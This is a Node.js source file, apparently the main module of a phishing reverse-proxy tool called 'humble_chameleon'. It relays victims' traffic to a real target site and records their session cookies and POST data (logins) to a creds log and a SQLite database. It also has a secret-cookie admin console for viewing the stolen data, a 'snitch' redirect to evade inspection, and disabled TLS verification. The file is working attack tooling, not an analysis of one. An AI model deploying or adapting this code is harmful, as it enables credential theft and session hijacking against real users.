//
//                      Project Index
//
// Print Banner 
// =======================================================
require("./banner.js");

// Require Modules
// =======================================================
https = require("https");
http = require("http");
url  = require('url');
zlib = require('zlib');
brotli = require('brotli');
replace = require('buffer-replace');
fs = require('fs');
colors = require('colors');
dateFormat = require('dateformat');
config_file = fs.readFileSync("./config.json");
config = JSON.parse(config_file);
admin_config_file = fs.readFileSync("./admin_config.json");
admin_config = JSON.parse(admin_config_file);
var chameleon = require('./humble_chameleon');
var route = require('./routes');
var views = require('./views');

// =======================================================
// Define some vars for later 
// =======================================================
success = "[" + "+".bold.green + "]"
fail = "[" + "-".bold.red + "]"
info = "[" + "*".blue + "]"
access_log = fs.createWriteStream(__dirname + '/logs/access.log', {flags : 'a'});
error_log = fs.createWriteStream(__dirname + '/logs/error.log', {flags : 'a'});
creds_log = fs.createWriteStream(__dirname + '/logs/creds.log', {flags : 'a'});
set_cookie = false;
victim_cookies = [];

// =======================================================
// Connect to/create the database
// =======================================================
var sqlite3 = require('sqlite3').verbose();
db = new sqlite3.Database('./db/humble.db', sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
  if (err) {
    console.error(err.message);
  }
  console.log('Connected to the humble database.');
});
 
db.serialize(function() {
  db.run("CREATE TABLE IF NOT EXISTS posts (timestamp TEXT, domain TEXT, url TEXT, post TEXT)");
  db.run("CREATE TABLE IF NOT EXISTS cookies (timestamp TEXT, domain TEXT, url TEXT, cookie TEXT)");
});
 
// =======================================================
//  Create Server
// =======================================================

var humble_chameleon = http.createServer(function(victim_request, humble_response){ 

  //get some target configs to set up a request to the real site
  requested_domain = victim_request.headers.host
  split_domain = requested_domain.split('.')
  humble_domain = split_domain.slice(-2).join('.')

  //get target from domain's config
  var target_object = route.getTarget(humble_domain, victim_request)
  target = target_object.target

  http_method = victim_request.method
  substitution_regex = RegExp(target, 'gi')
  reverse_sub_regex = RegExp(humble_domain, 'gi')
  postData = '';

  //collect any data from the body of the request
  //likely a POST request with some interesting data
  victim_request.on('data', function (data) {
    postData += data;
  });

  //wait for the end of the request to begin the proxy steps
  victim_request.on('end', function () {

    options = {
      host: victim_request.headers.host.replace(humble_domain, target),
      port: 443,
      path: url.parse(victim_request.url).path.replace(reverse_sub_regex, target),
      method: http_method,
      //wierd but it works somehow... Just the string will break a bunch of stuff
      headers: JSON.parse(JSON.stringify(victim_request.headers).replace(humble_domain, target))
    };

    //check to see if we have some cookies to save in the DB but don't save if it's just an amdin
    if ((options.headers.cookie != null) && !(options.headers.cookie.includes(admin_config.admin_cookie.cookie_name))) {
      //victim_cookies = options.headers.cookie;
      console.log(success + "Captured cookie: " + JSON.stringify(options.headers.cookie));
      access_log.write("[+]Captured cookie: " + JSON.stringify(options.headers.cookie) + "\n");
      creds_log.write("[+]Captured cookie: " + JSON.stringify(options.headers.cookie) + "\n");
      //create a db entry for it for our admin interface
      db.serialize(function() {
        var select = "SELECT cookie FROM cookies WHERE domain = ? AND cookie = ?"
        db.get(select, [requested_domain, JSON.stringify(options.headers.cookie)], (err, row) => {
          if (err) {
            return console.error(err.message);
          }
          //skip the cookie if we already captured it
          if (row) {
            console.log("skipping previously captured cookie")
	  } else { 
            var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?)");
            stmt.run(dateFormat("isoDateTime"),requested_domain,url.parse(victim_request.url).path, JSON.stringify(options.headers.cookie) )
            stmt.finalize();
          }
        });
      });
    }

    try {
      var admin = options.headers.cookie.includes(admin_config.admin_cookie.cookie_name + "=" + admin_config.admin_cookie.cookie_value)
      if(admin){
        //remove the admin cookie from the request so that the real sever doesn't see it
        admin_cookie_regex = RegExp(admin_config.admin_cookie.cookie_name + '.?=.?' + admin_config.admin_cookie.cookie_value + '.?;? ?', 'gi')
        options.headers.cookie = options.headers.cookie.replace(admin_cookie_regex, '')
      }
    } catch(err) {
      var admin = false
    }
    //redirect to the real site if we see the snitch
    if (target_object.target_type == "snitch") {
      views.redirect(target_object.target, humble_response)
    //set our admin cookie one time if the config tells us to
    } else if (target_object.target_type == "set_cookie") {
      views.set_cookie(target_object.target, humble_response)
    } else if (admin && (options.path.includes("config"))) {
      //log who is accessing the admin consoles
      console.log(success + dateFormat("isoDateTime") + " " + "Config Console Accessed By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path)
      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Config Console Accessed By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
      views.adminConfig(victim_request, humble_response);
    } else if (admin && (options.path.includes("access"))) {
      //log who is accessing the admin consoles
      console.log(success + dateFormat("isoDateTime") + " " + "Access Log Read By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path)
      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Access Log Read By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
      views.accessLog(victim_request, humble_response);
    } else if (admin && (options.path.includes("credz"))) {
      //log who is accessing the admin consoles
      console.log(success + dateFormat("isoDateTime") + " " + "Creds Log Read By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path)
      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Creds Log Read By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
      views.credsLog(victim_request, humble_response);
    } else {
      //remove any reference to the evil cookie if it is being used
      evil_cookie_regex = RegExp(config[humble_domain].cookie_search.cookie + '.?=.?' + config[humble_domain].cookie_search.cookie_value + '.?;? ?', 'gi')
      try{
        options.headers.cookie = options.headers.cookie.replace(evil_cookie_regex, '')
      }catch(err){
        //no cookies
      }
      //make a request to the real server and pipe the response back to the victim
      var req = https.request(options, chameleon.humbleProxy(victim_request, humble_response));

      req.on('error', function(err) {
        console.log(fail + dateFormat("isoDateTime") + " " + 'Caught exception: ', err);
        error_log.write("[-]" + dateFormat("isoDateTime") + " " + 'Caught exception: ' + err + "\n");
        access_log.write("[-]" + dateFormat("isoDateTime") + " " + 'Caught exception: ' + err + "\n");
      });
    

      //make sure to log any POST data we captured
      if (http_method == "POST") {
        if (postData != '') {
          console.log(success + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData)
          creds_log.write("[+]" + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData + "\n")
          access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Captured POST data for " + options.host + options.path + ": " + postData + "\n")
          db.serialize(function() {
            var stmt = db.prepare("INSERT INTO posts VALUES (?,?,?,?)");
            stmt.run(dateFormat("isoDateTime"),options.host,options.path,postData)
            stmt.finalize();
          });
        }
        req.write(postData.replace(reverse_sub_regex, target))
        console.log(postData.replace(reverse_sub_regex, target))
      }
      //close the web request after we've used it
      req.end();
    }
  });//end victim request callback function

})//end server definition

humble_chameleon.listen(8000)

//catch any server exceptions instead of exiting
humble_chameleon.on('error', function (e) {
  console.log(fail + dateFormat("isoDateTime") + " " + e);
  error_log.write("[-]" + dateFormat("isoDateTime") + " " + e + "\n");
  access_log.write("[-]" + dateFormat("isoDateTime") + " " + e + "\n");
});

//catch any node exceptions instead of exiting
process.on('uncaughtException', function (err) {
  console.log(fail + dateFormat("isoDateTime") + " " + 'Caught exception: ', err);
  error_log.write("[-]" + dateFormat("isoDateTime") + " " + 'Caught exception: ' + err + "\n");
  access_log.write("[-]" + dateFormat("isoDateTime") + " " + 'Caught exception: ' + err + "\n");
});

//catch ctrl-c
process.on('SIGINT', function() {
  console.log("Caught keyboard kill signal");
  db.close((err) => {
    if (err) {
      console.error(err.message);
      process.exit();
    }
    console.log('Closing the humble database connection.');
    process.exit();
  });
});

//ignore ssl errors from our target service
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
